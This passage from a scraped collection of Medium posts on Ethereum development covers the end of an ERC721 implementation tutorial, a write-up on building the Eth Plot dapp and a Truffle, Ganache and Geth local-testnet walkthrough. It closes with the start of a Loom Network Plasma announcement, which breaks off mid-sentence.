token in the owner\u2019s ownedTokens array to the index of the token that is being transferred and shorten the array by one (see lines 22\u201330). Lastly, we use the addTokenTo() function to add this token index to its new owner. And Transfer is an event.Now, a question to ask, how do we ensure that we are sending our ERC721 to a contract that can handle additional transfers? We know an externally owned account (EOA) can use our ERC721 full implementation contract to trade tokens if desired; however, if we send our token to a contract that is does not have the appropriate functions to trade and transfer the token via our original ERC721 contract, then the token will be effectively lost as there is no way to get it out. This sentiment reflects much of the concern that was brought to light through the ERC223 proposal, which is a proposed modification to ERC20 to prevent these erroneous transfers.In order to avoid issues and standardize, the ERC721 full implementation standard introduces the safeTransferFrom() function. Prior to diving into how that works, let\u2019s look at some additional requirements in which we have an ERC721Holder.sol contract that implements the ERC721Receiver.sol interface. The ERC721Holder.sol contract is to be part of the wallet, auction or broker contract in which you would want to hold an ERC721 token. The reason this has been standardized goes back to EIP165 in which the goal is to create \u201ca standard method to publish and detect what interfaces a smart contract implements.\u201d How do we detect an interface? Below we will see a \u201cmagic value,\u201d ERC721_RECEIVED, which is the function signature of the onERC721Received() function . A function signature is the first four bytes of the hash of the canonical signature string. In this case it is computed by bytes4(keccak256(\u201conERC721Received(address, uint256, bytes)\u201d)) as described below. What is the function signature used for? To find the place in the bytecode that contains the code for the called function called. Each function in your contract will have it\u2019s own signature, and when you make a call to your contract the EVM uses a series of switch cases to find the function signature that matches your call and executes your code accordingly. Consequently, in our ERCHolder contract we see that the onERCReceived() function signature will match the ERC721_RECEIVED variable in our ERC721Receiver interface.Your ERC721Holder contract is not a complete contract for handling ERC721 tokens. This template is meant to provide you with a standardized interface to verify that the ERC721Receiver standard interface is used. You will need to extend or inherit the ERC721Holder contract to include functions in your wallet or auction contract to handle ERC721\u2019s. Even to hold tokens in escrow you would need to add functionality so that this holder contract could make a call to transfer tokens out of the contract as needed.Now, back to our original ERC721 contract, the safeTransferFrom() works in the following way \u2014 you can either transfer using Option 1 in which there is no additional data included with the safeTransferFrom() function or you can use Option 2 to include data in the form of bytes _data. As before the transferFrom() function is used to remove token ownership from the _from address and add token ownership to the _to address. However, we have an additional requirement that we run the checkAndCallSafeTransfer() function. First, we check that the_to address is an actual contract through the use of the AddressUtils.sol library \u2014 I included the function isContract() in the below so that you can quickly see what it is doing. As noted, there is currently research and development into allowing external owned accounts (EOAs) on Ethereum maintain their own code as well, so whenever that point comes, it would need to be noted for a check like this. After verifying that _to is a contract address, we check that calling the onERC721Received() function returns the same function signature that we are expecting from our standard interface. If the correct value is not returned, then the transferFrom() function is rolled back as we have determined that the _to does not implement the expected interface.Whew, there we have it. Transferring ERC721 tokens. Now, burning tokens should look easy.BurningAs to ERC20, since we are only manipulating a single mapped balance, we only need to burn or destroy tokens against a specific address, which can be a user or a contract. In the below burn() , we specify the number of tokens that we would like to burn via the _value variable. The address against which to burn is the msg.sender, so we update their respective balances, and then we reduce the totalSupply_ of tokens as well. Here Burn and Transfer are events.For ERC721 tokens, we need to ensure that the specific token id or index is eliminated. Much like the addTokenTo() and _mint() function, our _burn() function uses super to call a function in our basic ERC721 implementation. First, we clearApproval(), then remove the token from ownership via removeTokenFrom() and use the Transfer event to alert this change on the front end. Next, we eliminate the metadata associated with that token by deleting what is mapped to that particular token index. Lastly, much like removing a token from ownership, we rearrange our allTokens array so that we replace the _tokenId index with the last token in the array.If you made it to the end, thanks for reading! I imagine the biggest challenges will be adapting these standards around how to mint ERC721\u2019s with the desired metadata and how to ensure transfer based on unique exchanges of values. At present, there are already a lot of examples \u2014 of course, the famous Cryptokitties, Cryptogs (from my team at EthDenver), Cryptocelebrities, Decentraland and if you visit OpenSea you can find a whole lot of digital assets and collectibles. I can imagine significantly more use cases for this standard \u2014 hope this write up helps to get you there\u2026!", "responses": 29, "tags": ["Ethereum", "Erc721", "Solidity", "Development", "Cryptoeconomics"]}, {"title": "What we learned building our first Ethereum Dapp", "post_link": "https://medium.com/coinmonks/what-we-learned-building-our-first-dapp-28b01f9fc244?source=search_post", "author_name": "Brendan Lee", "author_link": "https://medium.com/@brendan_87166", "publish_date": "2018-06-07", "last_modified_date": "2019-05-27", "readtime": "12.1", "claps": 1419, "voters": 252, "content": "What we learned building our first Ethereum DappBrendan LeeFollowJun 7, 2018 \u00b7 13 min readUpdate: if you enjoyed this article \u2014 check out what we\u2019re building at Nodesmith. We\u2019re making it easier for developers to build blockchain based applications, by providing them with all the core infrastructure to make polished & scalable applications.IntroductionA couple of months ago, myself and my colleague Samm decided it was past time we learned Ethereum and Solidity development. After passively following Ethereum since its launch, we decided to build an Ethereum Dapp as a side project to help us better understand the underlying technology.We had a few goals in mind for the Dapp we wanted to build:The Dapp had to be small in scope, but cover all the meaningful features of Ethereum and Solidity.The Dapp had to run without us needing to manage any cloud services ourselves \u2014 meaning we would only write client code and Ethereum smart contracts.We would open source whatever code we wrote and share what we learned.What we ended up building was a small game called Eth Plot! Eth Plot was inspired by Reddit\u2019s famous r/place April Fool\u2019s joke and by the million dollar homepage. It allows you to buy \u201cplots\u201d of digital space on a grid. In the plot you purchase, you can place an image and a link to a website of your choosing. You can also resell your plots at any given time.App screenshots showing a user purchasing a new plotFeel free to check out the Dapp here! It is running on the mainnet as well as Ropsten, Rinkeby and Kovan. We hope some folks use the application, but our primary goal with this project was our own education. We learned a lot, and in this article, we will share with you what we learned during this endeavor.Warning: this is a bit of a long read! Want to skip directly to the code? Here\u2019s the main smart contract, and here is the React/Redux application that forms the UI. We hope the sample code will be helpful to those embarking on the journey of building their first Dapp.Our intended audience for this article is developers who are familiar with Ethereum, but perhaps haven\u2019t written their first Dapp yet and would like an overview of what it entails, accompanied by some tips and tricks we picked up along the way. We do not claim to be experts, and aren\u2019t aiming to write another in-depth tutorial on Dapp development. Here\u2019s what we will be covering in this article:A high level overview of our tech stack \u2014 all the technologies we used to build Eth Plot.The details of the Eth Plot smart contract \u2014 implementing the functionality needed for this app in an efficient way was surprisingly complicated.Tips and tricks \u2014 a catch-all collection of helpful tidbits we learned while developing Eth Plot.Our Tech StackFor this project, we used the following stack:Solidity Smart Contracts \u2014 a primary contract and one helperIPFS for storing image data via InfuraTruffle and Ganache for our development and testing frameworkReact / Redux / Material UI / TypeChain for our front-end developmentMetaMask for our web3 provider in productionSmart ContractsThe core functionality of Eth Plot (the ability to buy and sell plots in a decentralized manner) is only made possible by Ethereum\u2019s smart contract functionality. We also make frequent use of events, which provide a cheaper form of storage and allow for responsiveness in our web app. Because the main smart contract that powers Eth Plot is the most interesting aspect of the project, we\u2019ve dedicated an entire section of this article to discussing it.IPFSTrying to store image data on-chain is prohibitively expensive. As is now fairly standard, we instead upload the image to IPFS, receiving a hash of that image file in the process. This hash is what we store on-chain. This allows Eth Plot to remain purely decentralized despite not storing all the data on Ethereum.To avoid the hassles associated with hosting and managing an IPFS node ourselves, we are using Infura\u2019s IPFS service.Truffle/GanacheTruffle is a helpful set of tools that makes testing Ethereum contracts much easier. We used Truffle to compile and deploy our smart contracts to a local Ethereum node. Ganache is the local Ethereum node that we used, which is a lightweight JavaScript based Ethereum client. We also used Truffle as our testing framework to test our smart contracts.React/Redux/Material UI/TypeChainFor our front end, we chose to use React, along with Redux for state management. This is a pretty standard web dev stack so we won\u2019t spend any time here, but feel free to checkout the source code for details.We also utilized components from the Material UI project. Material UI is set of React components that implements Google\u2019s Material Design spec. This is a very well written library, with good documentation, that provides a bunch of nice looking components.We enjoy writing our web based projects with TypeScript, so we utilized a helpful project called TypeChain which provides TypeScript bindings for Solidity contracts.MetaMaskAs is pretty standard, we require that users install MetaMask to interact with Eth Plot. Working with MetaMask was pretty straightforward, with a few exceptions:MetaMask is not ideal for local testing due to the unpredictable amount of caching. Even with the \u201cReset Account\u201d feature of MetaMask, there are times where transaction state can be cached, making development difficult. Instead, we directly used the web3 provider from ganache while developing locally.Dealing with changes in user accounts for MetaMask state is not ideal. The recommended approach is to run an interval that repeatedly checks the current account.That being said, MetaMask is a fantastic project, and the Dapp space would be nowhere near what it is today without MetaMask.Smart Contract Deep DiveThe main smart contract which backs Eth Plot was one of the most challenging and unique aspects of the project. This was primarily due to how expensive it is to store data and perform lots of computations in a contract.To start, we listed out the requirements of our contract:Define a grid system with constrained dimensions of at least 250x250.Each coordinate in the grid represents a 1x1 plot which has an owner, a buyout price, a website, and visual data associated with it.Plots can be larger than 1x1 to create a continuous area with an imageTo allow users to buy any plot they want \u2014 rather than being forced to buy an existing plot in its entirety \u2014 partial sections of plots can be sold and one plot can overlap another.Na\u00efve ApproachA na\u00efve approach to the problem would be to create a contract with a large 2D array. Each entry in that array would represent a coordinate of the full grid and contain the corresponding information for that coordinate. When purchasing a plot, the buyer would send in a transaction which indicates all the coordinates they\u2019d like to purchase and the data to associate.Unfortunately, looking at the gas price of storing data (the SSTORE operation) it costs 20,000 gas to store a single 32 byte word. For our array we\u2019d need to store at least 62,500 words (250x250) which would cost 1,250,000,000 gas. At a gas price of 5 gwei, that would cost ~6.25 ETH (~3,750 USD at the time of writing!) in transaction costs. This is also ~300 times higher than the maximum gas allowed in a single block (8,000,000 at time of writing). Even if we could get this kind of contract deployed, the transaction costs for interacting with it would be too high to ever see any adoption.Our Approach \u2014 Contract StorageUltimately, we came up with an approach that makes efficient use of the limited resources available and allows Eth Plot to function as intended.To start, let\u2019s look at how we store the state of our contract. First, instead of a 2D array representing individual coordinates, we store summaries of plots: their starting coordinate (x & y) and dimensions (height & width). This has the benefit of larger plots not costing any more to store than smaller ones. The contract stores an array of these plots in the order they were purchased, with later plots appearing after earlier ones in the array. This is called the ownership array in the contract. This ownership array contains an entry for each plot which includes its geometry (x, y, w, h) and the owning address. Because the geometry has a range of 0\u2013250, we can store each of the four values in a three byte uint24 variable. The owner\u2019s address is 20 bytes, which means each entry in the array takes 20 + (4 * 3) = 32 bytes. This is the exact word size in the EVM, making the storage more efficient.With this data representation, you might wonder how we support selling subsections of plots. We accomplish this with the holes mapping, which tracks information about which plots overlap each other, meaning that the later plot bought a subsection of the earlier plot. Here is an example representation of the relationship between the ownership and holes arrays.Adding this overlap logic was crucial as it allowed us to efficiently verify that the plot someone is trying to purchase is valid. By keeping the holes mapping up-to-date, we can keep much less state in memory when validating new purchases \u2014 preventing us from exceeding gas limits as seen in the na\u00efve approach.Next, instead of storing the image data directly in the blockchain, we upload the image for a particular plot to IPFS, then store the IPFS hash of that image in the contract. Along with the image hash, we store the website associated with the plot. This information is stored in its own mapping separate from the ownership object so we don\u2019t need to read it into memory while computing new purchases, making purchase transactions cheaper. This information is stored in the data mapping.Finally, we store the current buyout price for a particular plot in a separate mapping called plotIdToPrice. The buyout price for a plot can be updated by the owning user at any point. Just like the data mapping, this information is stored separately from the ownership data because we will access it much less often (only when computing payouts).Our Approach \u2014 Purchasing PlotsNow that we\u2019ve looked at the data storage, let\u2019s walk through what happens when purchasing a plot. The function you call to purchase a new plot is called purchaseAreaWithData. The data is specified in a somewhat unique format to make the execution of the contract as efficient as possible.In our initial versions, the caller simply passed in the rectangle they wanted to purchase, and the contract attempted to compute all of the sub-plots which needed to be purchased. This worked in small cases, but we quickly pushed the limits of the EVM and encountered inflated transaction costs and stack-too-deep errors caused by the amount of data which was loaded into memory. Instead, the caller of the method (the web app in our case) does all of the computation beforehand and the contract merely validates this data and transfers funds. To do this, the caller sends in an array of sub-plots which form a complete tiling of the purchased area. These sub-plots represent sections of the existing plots which are about to be purchased. In addition to the sub-plots, the indices where these sub-plots exist are also passed into the function.The contract itself is heavily commented and worth taking a look at, but here is a high level overview of what the purchase function does:Validates & bounds checks input parameters.Check to see that the sub-plots passed in form a complete tiling of the plot being purchased.Checks to make sure that all of the sub-plots being purchased are for sale and are still owned by the plot which the caller said they are purchasing from (this is where the holes structure is used).Pays out the owners of all the sub-plots with the funds sent in with the transaction and emits events for the transfers.Stores the new plot, the new data, the buyout price, updates all of the holes arrays with all the new purchases, and emits a purchased event.Other FunctionalityThe remainder of the contract contains a few trivial functions which are less interesting. This includes owner accessible functions for changing the buyout price of a plot and changing the plot\u2019s data, as well as admin functions for marking content as illegal and withdrawing the funds which have collected in the contract. Finally, there are some view functions which make reading the contract\u2019s data more efficient by aggregating information from the various separate data structures.Why Not Use ERC-721?When we were working on our design, we came across the ERC-721 specification which looked promising, but ultimately didn\u2019t fit with the requirements we had. The biggest issue we weren\u2019t able to solve with ERC-721 was how to subdivide plots to allow for selling just a section of a plot. The other issue we saw with ERC-721 was there was no way to recombine the tokens into larger plots once they had been subdivided.Tips and TricksWe had some other interesting takeaways from this project which we wanted to share.It\u2019s tough to determine transaction costs, so write some tests then guess and check \u2014 One of the most useful optimization techniques for us was to write some unit tests which ran through what we thought was a representative set of transactions for our contract. By calculating the gas cost of this test, we could experiment with refactoring the contract and seeing what impact that had on gas cost. We were able to make the contract~40% more efficient using this technique.Compute off-chain, validate on-chain \u2014 Any computation you can move out of the contract is worth it. If you find yourself writing complex contract code, see if you can instead compute more things off-chain and just have the contract validate that data. For example, rather than doing all the purchase computations in the contract itself, we pushed much of that work to the client \u2014 code sample here.Pay attention to how storage is structured, mappings may be better than arrays \u2014 One interesting observation which came out of our optimization exercises was how much of a difference it made to split up our related data into multiple objects. Since the EVM has to load full words into memory at a time, only storing the plot geometry and owner in the ownership array prevented loading unneeded data about images, buyout prices, etc. Additionally, using mappings instead of parallel arrays for those other data structures was much cheaper because we don\u2019t need to update the length value of the arrays (which involves an expensive SSTORE operation).The truffle debugger is massively helpful, when it works \u2014 Using the truffle framework was very helpful as it allowed us to deploy local testnets, write unit tests, and debug contracts. The truffle debugger (truffle debug command) was really helpful for debugging transactions which failed during manual testing. Unfortunately, due to how truffle unit tests are set up, the debugger doesn\u2019t allow you to debug transactions originating from unit tests.truffle doesn\u2019t enable optimization by default \u2014 while writing this article, we realized that truffle compile doesn\u2019t enable contract optimization by default. Turning it on saved another ~20% gas in our tests. You can enable it via the truffle-config file.ConclusionThank you for reading! We learned a great deal during this project and plan to do much more Ethereum development in the future.Again, checkout the Eth Plot application in action! We aren\u2019t looking to earn whatever fake internet points are available here, but we would love to engage with you, so please leave any comments or questions here or on the GitHub repo. Everything is open sourced, so take a look if you are searching for some starter code for the development of your first (or next) Dapp.Update: August 2018We learned something else after having this on the mainnet! If you\u2019ve tried out the app recently on the mainnet, you\u2019ll notice it\u2019s painfully slow to load in the beginning. For those curious, the reason for this is that we are storing our app data in event logs for the sake of price. The downside here is that it is extremely time consuming to search through logs, especially on the mainnet. We didn\u2019t notice this flaw when testing locally and on test nets due to size.In order to solve this, we would need to add a dedicated caching layer. We likely won\u2019t spend the time adding it to EthPlot since we are working on some other projects currently, but it\u2019s helpful to keep in mind. I can foresee a future Infura (or Infura competitor!) making a feature to help with this issue as well.Update: November 2018EthPlot was one of the motivating factors that resulted in us starting Nodesmith.io. We wanted to build a service that gives you everything you need to build a decentralized application that doesn\u2019t feel like it\u2019s usability is hindered by the underling blockchain infrastructure. With Nodesmith, we\u2019re giving you APIs that not only give you access to underlying blockchain infrastructure (like sending transactions and reading network state), but also gives you services that supercharge your application to make it more user friendly. For example, we\u2019re adding smart contract event caches to make reading event logs really fast. We\u2019re also adding a webhooks API so you don\u2019t have to constantly poll the network.Check the project out on Twitter or Medium if you want more information!", "responses": 11, "tags": ["Ethereum", "Solidity", "Blockchain", "Dapps", "Tutorial"]}, {"title": "Ethereum Development Walkthrough (Part 2: Truffle, Ganache, Geth and Mist)", "post_link": "https://medium.com/hackernoon/ethereum-development-walkthrough-part-2-truffle-ganache-geth-and-mist-8d6320e12269?source=search_post", "author_name": "dev_zl", "author_link": "https://medium.com/@dev_zl", "publish_date": "2018-01-15", "last_modified_date": "2019-04-29", "readtime": "10.4", "claps": 1979, "voters": 249, "content": "Ethereum Development Walkthrough (Part 2: Truffle, Ganache, Geth and Mist)dev_zlFollowJan 15, 2018 \u00b7 11 min readWe have seen in the first part of this tutorial series what a smart contract is, and how it works. Now, we will deploy it to two kinds of test networks.The tools we will useThe most prominent tools at the moments are:Truffle: A development environment, testing framework and asset pipeline for Ethereum. In other words, it helps you develop smart contracts, publish them, and test them, among other things. You can read the docs of the Truffle suite for more informations.Ganache: It was called TestRPC before, if you have read a tutorial from a few months ago, chances are they use TestRPC with Truffle, but it was renamed upon the integration of TestRPC within the Truffle Suite. What Ganache does is simple, it creates a virtual Ethereum blockchain, and it generates some fake accounts that we will use during development.Mist: It\u2019s a browser for decentralized web apps. It seeks to be the equivalent of Chrome or Firefox, but for Dapps. It\u2019s still insecure and you shouldn\u2019t use it with untrusted dapps as of yet.Ethereum wallet: It\u2019s a version of Mist, but only opens one single dapp, the Ethereum Wallet. Mist and Ethereum Wallet are just UI fronts. And we need a core that will connect us to an Ethereum blockchain(It could be the real Ethereum blockchain, or a test one).Geth: Is the core application on your computer that will connect you to a blockchain. It can also start a new one (in our case we will create a local test blockchain), create contract, mine ether etc.We will start by using Truffle and Ganache, and then use Truffle with geth and Mist.InstallationsThe requirements for this tutorial are that you know what is and how to use a command-line tool, and you are a bit familiar with NPM.TruffleOpen up a command-line, and type the next part:npm install -g truffleIf something goes wrong I advise you to read more on Truffle\u2019s docs.GanacheThen, install Ganache\u2019s command-line interface:npm install -g ganache-cliIf you are unsure about something, here is Ganache\u2019s Github page.N.B: There is a GUI for Ganache, but because we are such haxors, we will use the CLI.Let\u2019s startFirst, create a new folder, and type the next line:truffle initIt will initialize an empty truffle project.Then copy the Wrestling.sol file from the last tutorial, into the folder \u201ccontracts\u201d.Next, open the folder \u201cmigrations\u201d and create a new file named \u201c2_deploy_contracts.js\u201d. Migrations are simply scripts that\u2019ll help us deploy our contracts to a blockchain.Paste the following code inside, and save.The first line is there to import the \u201cWrestling.sol\u201d file from the \u201ccontracts\u201d folder, and the 4th line deploys it to the blockchain.Now, back to the root folder, you\u2019ll see two files, \u201ctruffle.js\u201d and \u201ctruffle-config.js\u201d. If you are on Windows, remove \u201ctruffle.js\u201d, if you are on another system, remove one of them, or keep them both, it\u2019s not important. The reason for that is, on Windows there is a naming problem, and when we will want to execute Truffle commands, it will open the config file \u201ctruffle.js\u201d instead of reading what\u2019s inside.I\u2019m writing this tutorial on Windows, so I\u2019ll remove the \u201ctruffle.js\u201d file. Then I\u2019ll put this code inside of \u201ctruffle-config.js\u201d:It basically says, that, when using the development network, connect to the host at \u201c127.0.0.1\u201d (localhost), using the port 7545.Now we are ready to test our code on a blockchain!Testing our codeIn the first part, we will use Ganache.Fire a new command-line and type in the following command:ganache-cli -p 7545What it does is, it tells ganache-cli to start at the port 7545.Ganache will generate test accounts for us, they have 100 ether by default, and are unlocked so we can send ether from them freely. The first account for example is the guy right here:Now, back to our first command-line interface, we execute two commands:truffle compiletruffle migrate --network developmentCompile will compile our Solidity code to bytecode (the code that the Ethereum Virtual Machine (EVM) understands), in our case, Ganache emulates the EVM.Migrate will deploy the code to the blockchain, in our case, the blockchain could be found in the network \u201cdevelopment\u201d we set earlier in the \u201ctruffle-config.js\u201d file.Now, if everything has gone as expected, you should see this on your terminal:Notice that it shows the address of the instantiated Wrestling contract.On the commande-line interface where ganache-cli is run, you can see the transactions being executed:Notice that it shows the address of the instantiated Wrestling contract.Now type the following command to start Truffle\u2019s console. It will help us interact with ganache\u2019s blockchain.truffle console --network developmentFirst, we will execute this commands:account0 = web3.eth.accounts[0]account1 = web3.eth.accounts[1]It will assign the address of the first account to the variable account0, the second to the variable account1. Web3 is a JavaScript API that wraps RPC calls to help us interact with a blockchain in an easy way.Then we will write this:Wrestling.deployed().then(inst => { WrestlingInstance = inst })It assigns a reference to the instance of the contract that truffle deployed to the variable \u201cWrestlingInstance\u201d.Execute the the next line:WrestlingInstance.wrestler1.call()It will return the address of the wrestler1, in our case it was the first account. Truffle, during the migration, picked up the default account from Ganache, which is the first account, because we didn\u2019t specify another account address during the migration, or another address in the configuration file of Truffle.We will then register the second account as an opponent:WrestlingInstance.registerAsAnOpponent({from: account1})Here, the \u201cfrom\u201d directive tells the function from which account the transaction should be fired.Upon executing the line, it should return something similar to this:Notice that the transaction used Gas, and it fired the event \u201cWrestlingStartsEvent\u201d.You could retrieve the address of the second wrestler by executing the following line:WrestlingInstance.wrestler2.call()Now, the players can wrestle:WrestlingInstance.wrestle({from: account0, value: web3.toWei(2, \"ether\")})WrestlingInstance.wrestle({from: account1, value: web3.toWei(3, \"ether\")})// End of the first roundWrestlingInstance.wrestle({from: account0, value: web3.toWei(5, \"ether\")})WrestlingInstance.wrestle({from: account1, value: web3.toWei(20, \"ether\")})// End of the wrestlingThe \u201cvalue\u201d directive is used to send ether with a transaction. The \u201cweb3.toWei(5, \u201cether\u201d)\u201d part sends 5 ether, that value is converted to Wei. Wei is the base unit (lowest denomination) of ether. More infos could be found at this link.Upon executing the last line, the account1 will be the winner, since we put 23 ether in total with it, and it\u2019s more than the double of what we put with the account0.A little exercise for you is to withdraw the ether from the contract.Now, it\u2019s up to you to research how to use Truffle\u2019s and Ganache\u2019s advanced features. You can start by reading the docs, and alternatively, here is an excellent introduction to Truffle if you felt lost or want to reinforce your knowledge on what we just saw.How geth will fit in the pictureNow, if we used Ganache for development, we would want to use something closer to a real environment, if only just to be more familiar with it.InstallationsStart by downloading geth. On Windows, you might need to add geth\u2019s installation folder to your PATH variable.Download Mist or Ethereum Wallet. For our use, both will be alike, so it doesn\u2019t matter which one you pick.Onto the creation of the local private test networkIn the same root folder, create a new file, and name it \u201cgenesis.json\u201d. Then past the following content in it.The file \u201cgenesis.json\u201d is simply the configuration file that geth needs to create a new blockchain. It\u2019s not important to understand the content of the file for the moment.If you run geth without specifying any parameter, it will try to connect to the mainnet. The mainnet is the main network of Ethereum, the real blockchain of Ethereum.If you run Mist without specifiying any parameter, it will throw an error if an instance of geth is running. If you tell Mist to connect to the geth instance that is actually running(what we will do in a little moment) it\u2019ll work just fine. If you run Mist while no instance of geth is running, it will start a new instance of geth, and eventually ask you from which blockchain network it should download blocks.There is a public Ethereum test network, but we will create our own private test network locally, using the \u201cgenesis.json\u201d file we created earlier.Fire up another command-line interface and type in the following (be sure to run it in your project root folder):geth --datadir=./chaindata/ init ./genesis.jsonWe launch geth and specify where our blockchain will be stored, here in the \u201cchaindata\u201d folder (it will be automatically generated), and we initialize it with our \u201cgenesis.json\u201d configuration file.We then start geth using the following command:geth --datadir=./chaindata/ --rpcThe \u201c--rpc\u201d parameter tells geth to accept RPC connections, it\u2019s needed so that truffle can connect to geth.Open another command-line interface, and start Mist (or Ethereum Wallet), using the same parameters:mist \u2013rpc http://127.0.0.1:8545The \u201c-rpc\u201d tells Mist (or Ethereum Wallet) to connect to the instance of geth we started.In the Wallets tab, press Add Account and create a new wallet:Notice that we are using a private network. Beware of that, you wouldn\u2019t want to use you ether on the Mainnet for development purposes.I will create an account using the password \u201c123456789\u201d. In a real environment, use a stronger password.Open up a new command-line interface and run this command:geth attachIt will run the console of geth, and we can now interact with it.With out main account created on the Mist UI, we will run this command inside of \u201cgeth attach\u201d console:miner.start()It will start a miner, the process that will confirm transactions, and after a few seconds or minutes (depending or your computer), you should start seeing ether being added to your balance (And also to your main account):Note that if you don\u2019t have enough RAM available, it may not start mining at all. You can stop the mining using the command \u201cminer.stop()\u201d.Now, open the \u201ctruffle-config.js\u201d file again, and modify it like this:The \u201courTestNet\u201d is the configuration necessary to connect to the geth instance. Geth starts by default on port 8545.In the command-line interface where we launched \u201cgeth attach\u201d, we will unlock the account, so we can use it to migrate the Smart Contract from Truffle, using the following command:personal.unlockAccount('0x6AC4660c960Aaf5d9E86403DDAcB4791767e5869', '123456789')Here, I used the address of the account I just created, it would be a different address for you, and the password \u201c123456789\u201d that I\u2019ll use for these tests. Notice that the password is shown in plain text, and you should use a different method with a real account.Now, back to the command-line interface where we previously launched Truffle, run this command:truffle migrate --network ourTestNetIt will start migrating the contract to the blockchain that geth is running. Start the miner if you previously stopped it, otherwise, the migration will not be executed.If the migration was successful, you would see an output like this:Now, run the following command to start Truffle\u2019s console:truffle console --network ourTestNetThen run these two commands:Wrestling.addressJSON.stringify(Wrestling.abi)You should have an output like this:The first line returns the address of the deployed Wresting contract instance.The second line, will return the Wresting contract ABI. The ABI is basically a description of the contract. It contains a list of its functions and variables among other things.When copying the address and the ABI, remove the apostrophes highlighted by a red arrow in the screenshot.Now, back to Mist, we will open the contracts tab, and click on watch contract.Then we will past the address and the ABI of the Wrestling contract we deployed:Click on \u201cOK\u201d, then it will be shown in your watched contracts list. Click on it and it will open the contract page. If you scroll down, you\u2019ll see something like this:Use the select a function part to interact with the contract. It\u2019s the same as we did above using Truffle\u2019s console.And that\u2019s it, we saw how Ganache and geth come in play. When you will want to deploy a contract to the real blockchain, you should use the second method and connect geth with the mainnet.N.B: You could deploy a contract directly on Mist without using Truffle migration system, here is an example video of that process. Using Truffle is more interesting in a real development process though, since you\u2019ll be able to include and import multiple other smart contracts and scripts if you use a modular approach to develop your smart contracts.N.B.2: You could always write your contract code on a basic nodepad application, and deploy it to the mainnet using some trusted third party\u2019s portal, but I advise you to not.The repository for this tutorial can be found here:devzl/ethereum-walkthrough-2ethereum-walkthrough-2 - Repository for the second part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comIn conclusionWe have seen 4 ways of developing and deploying our Smart Contracts:The first one is to use Truffle and Ganache. Since we copied the code from the last tutorial, I want to tell you that there are plugins available for the most popular text editors and IDEs. Some offer only syntax highlighting, while others help with other areas.The second one is to deploy code from Truffle to geth (and the GUI app Mist).The third, is to use Remix to write small, simple contract when you are just learning Solidity, and deploying the code in Mist like shown in the video previously linked.Or like a real cowboy, you could use a simple text editor to write and then deploy your untested contract using a nameless third party\u2019s drag-and-drop deployment feature.In the next part, we will discuss security since our \u201cWrestling\u201d script is far from being ready to be launched in a real environment.After, that we will see Token creation, and Initial Coin Offerings (ICOs).If you liked this second part, you can find me on twitter @dev_zl.", "responses": 40, "tags": ["Ethereum", "Blockchain", "Tutorial", "Development", "Solidity"]}, {"title": "Plasma on Loom Network DAppChains: Scalable DApps With Ethereum-Secured Assets", "post_link": "https://medium.com/loom-network/loom-network-plasma-5e86caaadef2?source=search_post", "author_name": "Matthew Campbell", "author_link": "https://medium.com/@kanwisher", "publish_date": "2018-04-13", "last_modified_date": "2019-08-19", "readtime": "3.95", "claps": 3268, "voters": 232, "content": "Plasma on Loom Network DAppChains: Scalable DApps With Ethereum-Secured AssetsMatthew CampbellFollowApr 13, 2018 \u00b7 4 min readUpdate:We released our Plasma Cash implementation in June 2018. Check out the release announcement here.Articles in this series:Plasma on Loom Network DAppChains: Scalable DApps With Ethereum-Secured Assets \ud83d\udc48Practical Plasma (Volume I): GamingPlasma Cash Initial Release \u2014 Plasma-Backed NFTs Now Available on Loom Network SidechainsProudly Announcing Development of Plasma Support for Loom DAppChainsWhen Plasma?? In the month since our first DAppChain DelegateCall went live, people have been asking us constantly whether we are competing against Plasma. We were also asked by Vitalik Buterin whether we planned to \u201cinclude Plasma-like constructions to mitigate trust dependence on the Loom chain consensus.\u201dThe issue boils down to this: DAppChains are convenient, but they require trust assumptions to be made in order to achieve their scalability goals. Using DPoS, they can be decentralized given enough honest witnesses, but we realized this was not good enough. As a result, we started searching for other ways to enable DAppChains to bring scalability, all while compromising neither security nor decentralization.After discussing scalability with Vitalik and David Knott, implementor of the Plasma MVP, we quickly discovered that Plasma, and more specifically Plasma Cash, is a great addition to the DPoS sidechains we are building at Loom Network.We are convinced of Plasma\u2019s utility, feasibility, and desirability. We want Loom to be the go-to platform for companies that need turn-key, automated Plasma security for their public and private chains.How Plasma Cash Secures Game AssetsPlasma Cash allows users to transfer assets like Tokens onto sidechains securely.It does this by associating the tokens you deposit onto a sidechain with a unique serial number. The token is non-fungible and has its own transaction history. This allows for more compact proofs on a coin\u2019s history along with the possibility of zero-confirmation transactions.As a result, exchanges and games can benefit from this as they can operate on an efficient sidechain, and in the case of a hack or fraud, users can reclaim their funds or rare-collectibles on the Ethereum mainchain through Plasma exits.The goal is to be able to have users leave their assets on the DAppChain with total peace of mind.Why Is It Important to DAppChains?DAppChains are distributed and secured via DPoS. However, DPoS is not fully decentralized and requires users to put some level of trust in the witnesses running the network.By combining DAppChains with Plasma Cash, we can have better security and allow more critical operations to be run on a DAppChain without requiring a high level of trust.We envision mobile games that run on sidechains with collectible items on the Ethereum mainchain.DAppChains will support all kinds of tokens \u2014 you could even transfer Ether to use it on a DAppChain-based decentralized exchange.Users no longer have to trust the sidechains, since they are further secured by Plasma Cash constructs.Plasma + CryptoZombies BattlegroundReal time card battles on a DAppChainCryptoZombies Battleground is our Collectible Card Game (CCG) where you can buy decks of zombie cards and play out PvP battles on a DAppChain.We expect our first use of Plasma to incorporate ERC721 tokens for the cards. Using Plasma Cash, users will be able to use the cards on a sidechain, while still being able to transfer ownership back to the Ethereum mainnet.Collectible Decks (ERC721 tokens)How will it work ?DAppChains will periodically report Merkle Proofs acting as checkpoints to the Ethereum mainnet. The frequency would depend on the desired level of security and cost (as more proofs require more bandwith).A Plasma Exit is the mechanism which allows a token holder to withdraw their funds from a Plasma Chain, in case of fraud or if they want to transact back on the mainnet.While the current Plasma MVP prototype is a great reference, we will be building our own custom implementation specifically around its use case in games, in order to provide an improved user experience.For more questions, you can head to DelegateCall and we will be happy to answer them!To learn more about Plasma details, check this article by Karl Floersch.We expect to have our initial Plasma implementation ready in June, along with our general public release of the Loom SDK.In closing, Plasma and DAppChains are like peanut butter and jelly. They are very complementary technologies, that only make sense to combine together. Plasma-enabled DAppChains will allow developers to create a whole suite of applications with scalability that is orders of magnitude better than the current limits, while still retaining decentralization and security.We are glad that Vitalik sees the potential of Loom to make the Foundation\u2019s theoretical efforts accessible and usable for developers.Want to learn DAPP Development? Click here for \u201c The Ultimate Guide to DApp Development \u201cLoom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools 